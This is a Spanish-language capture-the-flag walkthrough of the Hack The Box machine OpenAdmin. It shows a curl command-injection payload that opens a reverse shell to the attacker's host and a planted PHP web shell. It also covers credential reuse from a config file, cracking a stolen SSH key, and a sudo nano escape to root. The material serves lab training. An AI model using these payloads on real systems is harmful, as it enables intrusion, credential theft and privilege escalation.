---
title: Hack The Box OpenAdmin
author: k4miyo
date: 2022-01-02
math: true
mermaid: true
image:
  path: /assets/images/htb/hacktehbox.png
categories: [Easy, Linux]
tags: [File Misconfiguration, Web]
ping: true
---

## OpenAdmin
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.171.

```bash
❯ ping -c 1 10.10.10.171
PING 10.10.10.171 (10.10.10.171) 56(84) bytes of data.
64 bytes from 10.10.10.171: icmp_seq=1 ttl=63 time=142 ms

--- 10.10.10.171 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 141.934/141.934/141.934/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.171 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-02 20:53 CST
Initiating Ping Scan at 20:53
Scanning 10.10.10.171 [4 ports]
Completed Ping Scan at 20:53, 0.16s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:53
Scanning 10.10.10.171 [65535 ports]
Discovered open port 80/tcp on 10.10.10.171
Discovered open port 22/tcp on 10.10.10.171
SYN Stealth Scan Timing: About 41.36% done; ETC: 20:54 (0:00:44 remaining)
Completed SYN Stealth Scan at 20:54, 66.70s elapsed (65535 total ports)
Nmap scan report for 10.10.10.171
Host is up (0.17s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 67.00 seconds
           Raw packets sent: 66481 (2.925MB) | Rcvd: 66478 (2.659MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.171
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80 10.10.10.171 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-02 20:55 CST
Nmap scan report for 10.10.10.171
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.79 seconds
```

Vemos el puerto 80 abierto, por lo que antes de ver su contenido vía web, vamos a ocupar la herramienta `whatweb`:

```bash
❯ whatweb http://10.10.10.171/
http://10.10.10.171/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.171], Title[Apache2 Ubuntu Default Page: It works]
```

No vemos nada interesante, asi que vamos a verlo vía web:

![](/assets/images/htb-openadmin/openadmin-web.png)

Es la página default de Apache2, asi que a este punto vamos a tratar de descubrir rutas del servidor con `wfuzz`:

```bash
❯ wfuzz -c --hc=404 --hw=964 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  http://10.10.10.171/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.171/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000172:   301        9 L      28 W       312 Ch      "music"                                                         
000005045:   301        9 L      28 W       314 Ch      "artwork"                                                       
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 389.5932
Processed Requests: 25512
Filtered Requests: 25510
Requests/sec.: 65.48367
```

Tenemos dos recursos, `/music` y `/artwork`, vamos a ver que onda:

![](/assets/images/htb-openadmin/openadmin-web1.png)

![](/assets/images/htb-openadmin/openadmin-web2.png)

Ya vemos algo que nos debe de llamar la atención, en el recurso `/music` tenemos un **Login**, así que vamos a darle click.

![](/assets/images/htb-openadmin/openadmin-web3.png)

Nos encontramos ante ***OpenNetAdmin*** de versión 18.1.1; por lo que vamos a buscar posibles exploits relacionados y encontramos uno que nos puede ayudar:

```bash
❯ searchsploit opennetadmin 18.1.1
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                   | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                                    | php/webapps/47691.sh
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Si checamos `php/webapps/47691.sh`, ya que en este sitio no ocupamos metasploit, vemos que manda cierta data por el método POST mediante la herramienta `curl`; así que vamos a quedarnos con eso y tratar de entablarnos una reverse shell, por lo que nos ponemos en escucha por el puerto 443:

```bash
❯ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >& /dev/t
cp/10.10.14.27/443 0>&1'&xajaxargs[]=ping" "http://10.10.10.171/ona/"
```

Vemos que no se nos entabla la reverse shell, así que vamos a modificar los ampersand (&) por su valor en URL encode (%26).

```bash
❯ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >%26 /dev/tcp/10.10.14.27/443 0>%261'&xajaxargs[]=ping" "http://10.10.10.171/ona/"
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...

connect to [10.10.14.27] from (UNKNOWN) [10.10.10.171] 40406
bash: cannot set terminal process group (1300): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$ 
www-data@openadmin:/opt/ona/www$ whoami
whoami
www-data
www-data@openadmin:/opt/ona/www$
```

Ya nos encontramos como el usuario **www-data** y antes de hacer cualquier cosa, vamos a hacer un [Tratamiento de la tty](/posts/tratamiento-tty). Ahora dentro del directorio en donde nos encontramos, ya vemos algunas cosas curiosas, como archivos y directorios de configuración:

```bash
www-data@openadmin:/opt/ona/www$ ls -la
total 72
drwxrwxr-x 10 www-data www-data 4096 Nov 22  2019 .
drwxr-x---  7 www-data www-data 4096 Nov 21  2019 ..
-rw-rw-r--  1 www-data www-data 1970 Jan  3  2018 .htaccess.example
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 config
-rw-rw-r--  1 www-data www-data 1949 Jan  3  2018 config_dnld.php
-rw-rw-r--  1 www-data www-data 4160 Jan  3  2018 dcm.php
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 images
drwxrwxr-x  9 www-data www-data 4096 Jan  3  2018 include
-rw-rw-r--  1 www-data www-data 1999 Jan  3  2018 index.php
drwxrwxr-x  5 www-data www-data 4096 Jan  3  2018 local
-rw-rw-r--  1 www-data www-data 4526 Jan  3  2018 login.php
-rw-rw-r--  1 www-data www-data 1106 Jan  3  2018 logout.php
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 modules
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 plugins
drwxrwxr-x  2 www-data www-data 4096 Jan  3  2018 winc
drwxrwxr-x  3 www-data www-data 4096 Jan  3  2018 workspace_plugins
www-data@openadmin:/opt/ona/www$
```

Si revisamos los archivos, no vemos nada interesante, así que vamos a realizar una busqueda para directorios `config` y vemos uno bajo `./local/config` y si le echamos un ojo, tiene un archivo `database_settings.inc.php` el cual tiene unas credenciales:

 ```bash
 www-data@openadmin:/opt/ona/www$ find \-name config 2>/dev/null
./config
./local/config
www-data@openadmin:/opt/ona/www$ cd local/config/
www-data@openadmin:/opt/ona/www/local/config$ ls -l
total 8
-rw-r--r-- 1 www-data www-data  426 Nov 21  2019 database_settings.inc.php
-rw-rw-r-- 1 www-data www-data 1201 Jan  3  2018 motd.txt.example
-rw-r--r-- 1 www-data www-data    0 Nov 21  2019 run_installer
www-data@openadmin:/opt/ona/www/local/config$ cat database_settings.inc.php 
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>www-data@openadmin:/opt/ona/www/local/config$
 ```

Ahora vamos a ver que usuarios se encuentran a nivel de sistema, ya que es posible que la contraseña que tenemos sea de alguno de los usuarios:

 ```bash
 www-data@openadmin:/opt/ona/www/local/config$ cat /etc/passwd | grep "sh"
root:x:0:0:root:/root:/bin/bash
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
www-data@openadmin:/opt/ona/www/local/config$
 ```

 Vamos a tratar de migrar al usuario **jimmy**:

 ```bash
 www-data@openadmin:/opt/ona/www/local/config$ su jimmy
Password: 
jimmy@openadmin:/opt/ona/www/local/config$ whoami
jimmy
jimmy@openadmin:/opt/ona/www/local/config$
 ```

 Ya somos el usuario **jimmy**. Ahora vamos a enumerar un poco el sistema para ver de que forma podemos escalar privilegios.

```bash
jimmy@openadmin:/opt/ona/www/local/config$ id
uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal)
jimmy@openadmin:/opt/ona/www/local/config$ sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: error initializing audit plugin sudoers_audit
jimmy@openadmin:/opt/ona/www/local/config$ cd /
jimmy@openadmin:/$ find \-perm -4000 2>/dev/null                                                                                 
./usr/lib/openssh/ssh-keysign                                                                                                    
./usr/lib/eject/dmcrypt-get-device                                                                                               
./usr/lib/snapd/snap-confine                                                                                                     
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic                     
./usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                     
./usr/lib/policykit-1/polkit-agent-helper-1                     
./usr/bin/newgrp     
./usr/bin/pkexec                                                
./usr/bin/newgidmap                                             
./usr/bin/sudo                 
./usr/bin/passwd                                                
./usr/bin/newuidmap                                             
./usr/bin/chsh    
./usr/bin/traceroute6.iputils
./usr/bin/chfn               
./usr/bin/gpasswd           
./usr/bin/at
./bin/ping         
./bin/umount             
./bin/su                      
./bin/mount                                                     
./bin/fusermount    
./snap/core/7270/bin/mount
./snap/core/7270/bin/ping                                       
./snap/core/7270/bin/ping6
./snap/core/7270/bin/su
./snap/core/7270/bin/umount                                     
./snap/core/7270/usr/bin/chfn
./snap/core/7270/usr/bin/chsh
./snap/core/7270/usr/bin/gpasswd                                                                                                 
./snap/core/7270/usr/bin/newgrp
./snap/core/7270/usr/bin/passwd
./snap/core/7270/usr/bin/sudo
./snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
./snap/core/7270/usr/lib/openssh/ssh-keysign
./snap/core/7270/usr/lib/snapd/snap-confine
./snap/core/7270/usr/sbin/pppd
./snap/core/8039/bin/mount
./snap/core/8039/bin/ping
./snap/core/8039/bin/ping6
./snap/core/8039/bin/su
./snap/core/8039/bin/umount
./snap/core/8039/usr/bin/chfn
./snap/core/8039/usr/bin/chsh
./snap/core/8039/usr/bin/gpasswd
./snap/core/8039/usr/bin/newgrp
./snap/core/8039/usr/bin/passwd
./snap/core/8039/usr/bin/sudo
./snap/core/8039/usr/lib/dbus-1.0/dbus-daemon-launch-helper
./snap/core/8039/usr/lib/openssh/ssh-keysign
./snap/core/8039/usr/lib/snapd/snap-confine
./snap/core/8039/usr/sbin/pppd
jimmy@openadmin:/$ find \-user jimmy 2>/dev/null | grep -v -E "sys|proc|run"
./var/www/internal
./var/www/internal/main.php
./var/www/internal/logout.php
./var/www/internal/index.php
./home/jimmy
./home/jimmy/.local
./home/jimmy/.local/share
./home/jimmy/.local/share/nano
./home/jimmy/.local/share/nano/search_history
./home/jimmy/.bashrc
./home/jimmy/.cache
./home/jimmy/.cache/motd.legal-displayed
./home/jimmy/.profile
./home/jimmy/.gnupg
./home/jimmy/.gnupg/private-keys-v1.d
./home/jimmy/.bash_history
./home/jimmy/.bash_logout
jimmy@openadmin:/$
```

Vemos que el usuario **jimmy** es propietarios de archivos alojados en la ruta `/var/www/internal`, así que vamos a echarles un ojo.

```bash
jimmy@openadmin:/var/www/internal$ ls -l
total 12
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
jimmy@openadmin:/var/www/internal$ 
```

Vemos otro recurso web, sin embargo, no es lo que nosotros vemos por el puerto 80, así que trataremos de ver bajo que puerto correo este recurso.

```bash
jimmy@openadmin:/var/www/internal$ cd /etc/apache2/sites-available/
jimmy@openadmin:/etc/apache2/sites-available$ ls -l
total 16
-rw-r--r-- 1 root root 6338 Jul 16  2019 default-ssl.conf
-rw-r--r-- 1 root root  303 Nov 23  2019 internal.conf
-rw-r--r-- 1 root root 1329 Nov 22  2019 openadmin.conf
jimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
jimmy@openadmin:/etc/apache2/sites-available$
```

Tenemos que este sitio web corre bajo el puerto 52846, el cual no es visible desde afuera y está interno en la máquina. Además, el usuario asignado es **joanna**.

```bash
jimmy@openadmin:/etc/apache2/sites-available$ netstat -nat | grep 52846
tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN     
jimmy@openadmin:/etc/apache2/sites-available$
```

Como el usuario asignado es **joanna**, podriamos crear una shell en el directorio, hacer un ***Remote Port Forwarding*** para acceder a nuestra shell y entablarnos una reverse shell, que en este caso sería como el usuario asignado.

```bash
jimmy@openadmin:/var/www/internal$ ls -l
total 16
-rwxrwxr-x 1 jimmy internal 3229 Nov 22  2019 index.php
-rwxrwxr-x 1 jimmy internal  185 Nov 23  2019 logout.php
-rwxrwxr-x 1 jimmy internal  339 Nov 23  2019 main.php
-rw-rw-r-- 1 jimmy jimmy      66 Jan  3 04:35 shell.php
jimmy@openadmin:/var/www/internal$ cat shell.php 
<?php
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
jimmy@openadmin:/var/www/internal$
```

Hacemos el ***Remote Port Forwarding***:

```bash
jimmy@openadmin:/var/www/internal$ ssh -R 52846:127.0.0.1:52846 k4miyo@10.10.14.27 -p 2222
The authenticity of host '[10.10.14.27]:2222 ([10.10.14.27]:2222)' can't be established.
ECDSA key fingerprint is SHA256:X+58wT4JhCZo1JHA1IfaUg4HqR7NmOzkqFouwQwkYu0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[10.10.14.27]:2222' (ECDSA) to the list of known hosts.
k4miyo@10.10.14.27's password: 
Linux k4mipc 5.14.0-2parrot1-amd64 #1 SMP Debian 5.14.6-2parrot1 (2021-09-25) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|
                                                 



The programs included with the Parrot GNU/Linux are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Parrot GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov 28 21:14:59 2021 from 10.10.10.43
░▒▓    ~  ✔  with k4miyo@k4mipc ▓▒░ 
```

Validamos que el puerto 52846 se encuentra abierto en nuestra máquina:

```bash
❯ lsof -i:52846
COMMAND    PID   USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
sshd    635608 k4miyo   10u  IPv6 2028358      0t0  TCP localhost:52846 (LISTEN)
sshd    635608 k4miyo   11u  IPv4 2028359      0t0  TCP localhost:52846 (LISTEN)
```

Ahora nos abrimos el navegador hacia dicho puerto y apuntamos a nuestra shell:

![](/assets/images/htb-openadmin/openadmin-web4.png)

Podemos ejecutar comandos como el usuario **joanna** y como pista si checamos el contenido del archivo `main.php`, nos dice que dicho usuario tiene su archivo `id_rsa`; por lo tanto, vamos a tratar de obtenerlo para posteriormente tratar de ingresar puerto el puerto 22.

![](/assets/images/htb-openadmin/openadmin-web5.png)

Ya tenemos la `id_rsa`, asi que generamos un archivo con ese nombre, el damos permiso 600, creamos un hash con `ssh2john` y tratamos de crackearla.

```bash
❯ cat id_rsa
───────┬─────────────────────────────────────────────────────────────────
       │ File: id_rsa
───────┼─────────────────────────────────────────────────────────────────
   1   │ -----BEGIN RSA PRIVATE KEY-----
   2   │ Proc-Type: 4,ENCRYPTED
   3   │ DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
   4   │ 
   5   │ kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
   6   │ ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
   7   │ ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
   8   │ 6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
   9   │ ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
  10   │ y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
  11   │ 9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
  12   │ piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
  13   │ /U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
  14   │ 40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
  15   │ fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
  16   │ 9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
  17   │ X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
  18   │ S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
  19   │ FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
  20   │ Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
  21   │ RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
  22   │ uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
  23   │ 1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
  24   │ XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
  25   │ yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
  26   │ +4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
  27   │ qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
  28   │ z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
  29   │ K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
  30   │ -----END RSA PRIVATE KEY-----
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ chmod 600 id_rsa
❯ ssh2john.py id_rsa > hash
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (id_rsa)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:02 DONE (2022-01-02 22:55) 0.4347g/s 6235Kp/s 6235Kc/s 6235KC/sa6_123..*7¡Vamos!
Session completed
```

Tenemos la contraseña del archivo `id_rsa`, no del usuario. Ahora nos conectamos al servicio SSH como el usuario **joanna**.

```bash
❯ ssh -i id_rsa joanna@10.10.10.171
The authenticity of host '10.10.10.171 (10.10.10.171)' can't be established.
ECDSA key fingerprint is SHA256:loIRDdkV6Zb9r8OMF3jSDMW3MnV5lHgn4wIRq+vmBJY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.171' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jan  3 05:01:33 UTC 2022

  System load:  0.0               Processes:             182
  Usage of /:   31.0% of 7.81GB   Users logged in:       0
  Memory usage: 14%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$ whoami
joanna
joanna@openadmin:~$
```

Ya somos el usuario **joanna** y podemos visualizar la flag (user.txt). Ahora debemos enumerar un poco el sistema para ver de que forma nos convertimos en **root**.

```bash
joanna@openadmin:~$ id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
joanna@openadmin:~$
```

Vemos que podemos ejecutar `/bin/nano /opt/priv` como el usuario **root** sin proporcionar contraseña, por lo tanto vamos a utilizar nuestro recurso de confianza [gtfobins](https://gtfobins.github.io/gtfobins/nano/#shell) y para este caso la opción **a)** para obtener una shell como el propietario del binario, que es **root**.

```bash
joanna@openadmin:~$ sudo /bin/nano /opt/priv


Command to execute: reset; sh 1>&0 2>&0#                                                                                         
#  Get Help                                                     ^X Read File
#  Cancel                                                       M-F New Buffer
# whoami
root
# 
```

Ya somos el usuario **root** y podemos visualizar la flag (root.txt).

